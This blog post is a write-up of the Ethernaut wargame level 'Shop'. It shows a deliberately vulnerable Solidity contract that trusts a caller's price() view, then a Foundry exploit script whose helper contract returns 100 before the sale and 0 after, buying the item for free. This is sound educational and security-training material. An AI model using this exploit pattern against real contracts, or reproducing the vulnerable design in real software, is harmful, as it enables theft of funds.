---
layout: post
title: "[Ethernaut] 21.Shop"
tags: blockchain ethernaut foundry state view
---

# Analysis

---

The goal is “get the item from the shop for less than the price asked”.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

If the `price` from `msg.sender` is greater than or equal 100 and `isSold` is false, we can buy the item.
However, the goal is to get the item for less than 100.

# Exploit

---

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Shop.sol";
import "forge-std/Script.sol";

contract Ex {
    Shop public shop_ = Shop(0xF2e18d8912005C118E1776537Fa4da1eA756B2c7);

    function price() external view returns (uint256) {
        if (shop_.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }

    function ex() public {
        shop_.buy();
    }
}

contract ShopSol is Script {
    Shop public shop_ = Shop(0xF2e18d8912005C118E1776537Fa4da1eA756B2c7);

    function run() external {
        vm.startBroadcast();

        Ex ex = new Ex();
        ex.ex();
        console.log("item price: ", shop_.price());
        console.log("isSold: ", shop_.isSold());

        vm.stopBroadcast();
    }
}
```

The Shop contract retrieves the `price` from `msg.sender` . Therefore, we create assist(Ex) contract that returns diffrent `price` based on whether `isSold` is true or false.

The Shop contract should receive the `price` of 100 during the conditional check, and the `price` of 0 when the `price`  is updated.